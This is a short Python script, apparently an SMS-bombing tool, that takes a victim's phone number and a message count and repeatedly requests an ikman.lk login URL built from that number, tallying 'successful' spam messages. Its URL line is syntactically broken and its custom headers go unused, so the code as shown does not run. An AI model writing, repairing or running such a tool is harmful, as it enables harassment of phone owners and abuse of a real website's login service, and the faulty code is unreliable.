from tqdm import tqdm
import requests
print("""
Created By Manoj

███╗░░░███╗
████╗░████║
██╔████╔██║
██║╚██╔╝██║
██║░╚═╝░██║
╚═╝░░░░░╚═╝
""")
headers = ({'User-Agent':
        'Token Transit/4.2.4 (Android 9; sdk 28; gzip) okhttp'})
phoneNumber = input("Enter Phone Number: ")
phoneNumber = str(phoneNumber)
url = "https://ikman.lk/?login-modal=true&redirect-url=/"phoneNumber
numofmsgs = int(input("Enter Number Of Messages To Send: "))
successspamCount = 0
failspamCount = 0
for i in tqdm(range(numofmsgs)):
    resp = requests.get(url)
    if resp.status_code == 200:
        successspamCount = successspamCount + 1
    else:
        failspamCount = failspamCount + 1
print("Total Successful Messages Sent: ",  successspamCount)
print("Total Failed Messages Sent: ", failspamCount)
